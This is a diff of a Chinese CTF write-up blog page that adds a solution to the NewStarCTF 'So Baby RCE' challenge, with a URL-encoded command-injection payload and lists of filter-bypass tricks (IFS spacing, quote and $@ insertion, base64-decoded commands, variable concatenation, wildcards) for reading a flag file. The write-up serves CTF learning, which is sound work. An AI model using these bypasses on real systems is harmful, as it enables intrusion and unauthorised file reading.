@@ -21,12 +21,19 @@
 <meta property="og:image" content="https://x2nn.github.io/2024/07/14/CTF%E5%88%B7%E9%A2%98%E7%AF%871/sql_5.png">
 <meta property="og:image" content="https://x2nn.github.io/2024/07/14/CTF%E5%88%B7%E9%A2%98%E7%AF%871/sql_6.png">
 <meta property="og:image" content="https://x2nn.github.io/2024/07/14/CTF%E5%88%B7%E9%A2%98%E7%AF%871/flag.png">
+<meta property="og:image" content="https://x2nn.github.io/2024/07/14/CTF%E5%88%B7%E9%A2%98%E7%AF%871/rce_1.png">
+<meta property="og:image" content="https://x2nn.github.io/2024/07/14/CTF%E5%88%B7%E9%A2%98%E7%AF%871/rce_2.png">
+<meta property="og:image" content="https://x2nn.github.io/2024/07/14/CTF%E5%88%B7%E9%A2%98%E7%AF%871/rce_3.png">
+<meta property="og:image" content="https://x2nn.github.io/2024/07/14/CTF%E5%88%B7%E9%A2%98%E7%AF%871/rce1_1_1.png">
+<meta property="og:image" content="https://x2nn.github.io/2024/07/14/CTF%E5%88%B7%E9%A2%98%E7%AF%871/rce1_1_2.png">
+<meta property="og:image" content="https://x2nn.github.io/2024/07/14/CTF%E5%88%B7%E9%A2%98%E7%AF%871/rce1_1_3.png">
 <meta property="article:published_time" content="2024-07-14T08:41:22.000Z">
-<meta property="article:modified_time" content="2024-07-14T17:22:13.989Z">
+<meta property="article:modified_time" content="2024-07-16T18:09:28.650Z">
 <meta property="article:author" content="🖤">
 <meta property="article:tag" content="SQL注入">
 <meta property="article:tag" content="二分法">
 <meta property="article:tag" content="Web">
+<meta property="article:tag" content="RCE">
 <meta property="article:tag" content="CTF">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:image" content="https://x2nn.github.io/2024/07/14/CTF%E5%88%B7%E9%A2%98%E7%AF%871/sql_1.png">
@@ -137,7 +144,7 @@
     
     
       <div id="toc">
-        <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#NewStarCTF-2023-web-week3-midsql-sql"><span class="toc-number">1.</span> <span class="toc-text">[NewStarCTF 2023] web week3 midsql_sql</span></a></li></ol>
+        <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#NewStarCTF-2023-web-week3-midsql-sql"><span class="toc-number">1.</span> <span class="toc-text">[NewStarCTF 2023] web week3 midsql_sql</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#NewStarCTF-%E5%85%AC%E5%BC%80%E8%B5%9B%E8%B5%9B%E9%81%93-So-Baby-RCE"><span class="toc-number">2.</span> <span class="toc-text">[NewStarCTF 公开赛赛道]So Baby RCE</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%A9%BA%E6%A0%BC%E4%BB%A3%E6%9B%BF"><span class="toc-number">2.1.</span> <span class="toc-text">空格代替</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%AF%BB%E5%8F%96%E6%96%87%E4%BB%B6"><span class="toc-number">2.2.</span> <span class="toc-text">读取文件</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%8A%A0%E7%89%B9%E6%AE%8A%E5%AD%97%E7%AC%A6%E7%BB%95%E8%BF%87"><span class="toc-number">2.3.</span> <span class="toc-text">加特殊字符绕过</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%BC%96%E7%A0%81%E7%BB%95%E8%BF%87"><span class="toc-number">2.4.</span> <span class="toc-text">编码绕过</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%8B%BC%E6%8E%A5%E7%BB%95%E8%BF%87"><span class="toc-number">2.5.</span> <span class="toc-text">拼接绕过</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E9%80%9A%E9%85%8D%E7%AC%A6%E7%BB%95%E8%BF%87"><span class="toc-number">2.6.</span> <span class="toc-text">通配符绕过</span></a></li></ol></li></ol>
       </div>
     
   </span>
@@ -178,7 +185,7 @@
       
     <div class="article-tag">
         <i class="fa-solid fa-tag"></i>
-        <a class="p-category" href="/tags/CTF/" rel="tag">CTF</a>, <a class="p-category" href="/tags/SQL%E6%B3%A8%E5%85%A5/" rel="tag">SQL注入</a>, <a class="p-category" href="/tags/Web/" rel="tag">Web</a>, <a class="p-category" href="/tags/%E4%BA%8C%E5%88%86%E6%B3%95/" rel="tag">二分法</a>
+        <a class="p-category" href="/tags/CTF/" rel="tag">CTF</a>, <a class="p-category" href="/tags/RCE/" rel="tag">RCE</a>, <a class="p-category" href="/tags/SQL%E6%B3%A8%E5%85%A5/" rel="tag">SQL注入</a>, <a class="p-category" href="/tags/Web/" rel="tag">Web</a>, <a class="p-category" href="/tags/%E4%BA%8C%E5%88%86%E6%B3%95/" rel="tag">二分法</a>
     </div>
 
 
@@ -211,6 +218,50 @@
 <ul>
 <li><a target="_blank" rel="noopener" href="https://blog.csdn.net/m0_73512445/article/details/133694293">[NewStarCTF 2023] web题解</a></li>
 </ul>
+<h3 id="NewStarCTF-公开赛赛道-So-Baby-RCE"><a href="#NewStarCTF-公开赛赛道-So-Baby-RCE" class="headerlink" title="[NewStarCTF 公开赛赛道]So Baby RCE"></a>[NewStarCTF 公开赛赛道]So Baby RCE</h3><p>题目如下：</p>
+<p><img src="/2024/07/14/CTF%E5%88%B7%E9%A2%98%E7%AF%871/rce_1.png"></p>
+<p>发现代码中没有过滤<code>ls</code></p>
+<p><img src="/2024/07/14/CTF%E5%88%B7%E9%A2%98%E7%AF%871/rce_2.png"></p>
+<p>当前目录下什么东西，尝试跨目录读取文件，<code>cd </code>未过滤，<code>&amp;</code>未过滤，<code>cat</code>被过滤，通过添加特殊字符绕过<code>ca$@t</code>。记住$@特殊字符的使用，很多情况下可以绕过。</p>
+<p><img src="/2024/07/14/CTF%E5%88%B7%E9%A2%98%E7%AF%871/rce_3.png"></p>
+<p>Payload如下：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cd%09..%26%26cd%09..%26%26cd%09..%26%26ls%26%26ca$@t%09ffff$@llllaaaaggggg</span><br></pre></td></tr></table></figure>
+
+<h4 id="空格代替"><a href="#空格代替" class="headerlink" title="空格代替"></a>空格代替</h4><p>命令执行中空格被过滤。</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;</span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash">&#123;IFS&#125;</span></span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash">IFS<span class="variable">$9</span></span></span><br><span class="line"><span class="meta prompt_">%</span><span class="language-bash">09</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/2024/07/14/CTF%E5%88%B7%E9%A2%98%E7%AF%871/rce1_1_1.png"></p>
+<blockquote>
+<p><code>$IFS</code>在linux下表示分隔符，只有<code>cat$IFSa.txt</code>的时候，bash解析器会把整个IFSa当作变量名，所以导致没有办法运行，然而如果加上{}就固定了变量名，同理在后面加个$可以起到截断的作用。</p>
+<p><code>$9</code>指的是当前系统shell进程的第九个参数的持有者，若没有9个参数，则为空，因此$9相当于没有加东西，等于做了一个前后隔离。</p>
+</blockquote>
+<p>不仅仅局限于<code>$9</code>，$加一个一位数字均可。</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">!/bin/bash</span></span><br><span class="line"></span><br><span class="line">echo &quot;参数1：&quot; $1</span><br><span class="line">echo &quot;参数2：&quot; $2</span><br><span class="line">echo &quot;参数3：&quot; $3</span><br><span class="line">echo &quot;参数4：&quot; $4</span><br><span class="line">echo &quot;参数5：&quot; $5</span><br><span class="line">echo &quot;参数6：&quot; $6</span><br><span class="line">echo &quot;参数7：&quot; $7</span><br><span class="line">echo &quot;参数8：&quot; $8</span><br><span class="line">echo &quot;参数9：&quot; $9</span><br><span class="line">echo &quot;参数10：&quot; $10</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">测试  ./test.sh a b c d c d e f g h</span> </span><br></pre></td></tr></table></figure>
+
+<p>结果：</p>
+<p><img src="/2024/07/14/CTF%E5%88%B7%E9%A2%98%E7%AF%871/rce1_1_2.png"></p>
+<blockquote>
+<p><code>$8、$9</code>因为没有传递参数，返回的结果为空。</p>
+<p><code>$10</code>被解析成了<code>$1</code>和0，所以结果会是<code>a0</code>，若想获取第10个变量使用<code>$&#123;10&#125;</code>。</p>
+</blockquote>
+<h4 id="读取文件"><a href="#读取文件" class="headerlink" title="读取文件"></a>读取文件</h4><p><code>cat</code>被禁用，使用下列命令</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">cat   # 由第一行开始显示内容，并将所有内容输出</span><br><span class="line">tac   # 从最后一行倒序显示内容，并将所有内容输出</span><br><span class="line">more  # 根据窗口大小，一页一页的现实文件内容</span><br><span class="line">less  # 和more类似，但其优点可以往前翻页，而且进行可以搜索字符</span><br><span class="line">head  # 只显示头几行</span><br><span class="line">tail  # 只显示最后几行</span><br><span class="line">nl    # 类似于cat -n，显示时输出行号</span><br><span class="line">tailf # 类似于tail -f</span><br><span class="line">sort # 读文件</span><br></pre></td></tr></table></figure>
+
+<h4 id="加特殊字符绕过"><a href="#加特殊字符绕过" class="headerlink" title="加特殊字符绕过"></a>加特殊字符绕过</h4><p><code>cat</code>被禁用。</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">ca\t fl\ag.txt</span><br><span class="line"><span class="meta prompt_">ca$</span><span class="language-bash">@t fl<span class="variable">$@ag</span>.txt</span></span><br><span class="line">c&#x27;a&#x27;t flag.txt</span><br><span class="line">c&quot;a&quot;t flag.txt</span><br></pre></td></tr></table></figure>
+
+<h4 id="编码绕过"><a href="#编码绕过" class="headerlink" title="编码绕过"></a>编码绕过</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">`echo &#x27;Y2F0Cg==&#x27; | base64 -d`  flag.txt #cat </span><br></pre></td></tr></table></figure>
+
+<h4 id="拼接绕过"><a href="#拼接绕过" class="headerlink" title="拼接绕过"></a>拼接绕过</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a=c;b=at;c=f;d=lag;e=.txt;$a$b $c$d$e</span><br></pre></td></tr></table></figure>
+
+<h4 id="通配符绕过"><a href="#通配符绕过" class="headerlink" title="通配符绕过"></a>通配符绕过</h4><blockquote>
+<p>[…]表示匹配方括号之中的任意一个字符</p>
+<p>{…}表示匹配大括号里面的所有模式</p>
+<p>上述二则的区别，当匹配的文件不存在时，[…]会失去模式的功能，变成一个单纯的字符串，而{…}依然可以展开。</p>
+</blockquote>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">cat f?ag.txt</span><br><span class="line">cat fl*</span><br><span class="line">cat f[a-z]ag.txt</span><br><span class="line">cat fl&#123;a,b,c,d,e&#125;g.txt</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2024/07/14/CTF%E5%88%B7%E9%A2%98%E7%AF%871/rce1_1_3.png"></p>
 
   </div>
 </article>
@@ -242,7 +293,7 @@
     
     
       <div id="toc-footer" style="display: none">
-        <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#NewStarCTF-2023-web-week3-midsql-sql"><span class="toc-number">1.</span> <span class="toc-text">[NewStarCTF 2023] web week3 midsql_sql</span></a></li></ol>
+        <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#NewStarCTF-2023-web-week3-midsql-sql"><span class="toc-number">1.</span> <span class="toc-text">[NewStarCTF 2023] web week3 midsql_sql</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#NewStarCTF-%E5%85%AC%E5%BC%80%E8%B5%9B%E8%B5%9B%E9%81%93-So-Baby-RCE"><span class="toc-number">2.</span> <span class="toc-text">[NewStarCTF 公开赛赛道]So Baby RCE</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%A9%BA%E6%A0%BC%E4%BB%A3%E6%9B%BF"><span class="toc-number">2.1.</span> <span class="toc-text">空格代替</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%AF%BB%E5%8F%96%E6%96%87%E4%BB%B6"><span class="toc-number">2.2.</span> <span class="toc-text">读取文件</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%8A%A0%E7%89%B9%E6%AE%8A%E5%AD%97%E7%AC%A6%E7%BB%95%E8%BF%87"><span class="toc-number">2.3.</span> <span class="toc-text">加特殊字符绕过</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%BC%96%E7%A0%81%E7%BB%95%E8%BF%87"><span class="toc-number">2.4.</span> <span class="toc-text">编码绕过</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%8B%BC%E6%8E%A5%E7%BB%95%E8%BF%87"><span class="toc-number">2.5.</span> <span class="toc-text">拼接绕过</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E9%80%9A%E9%85%8D%E7%AC%A6%E7%BB%95%E8%BF%87"><span class="toc-number">2.6.</span> <span class="toc-text">通配符绕过</span></a></li></ol></li></ol>
       </div>
     
 
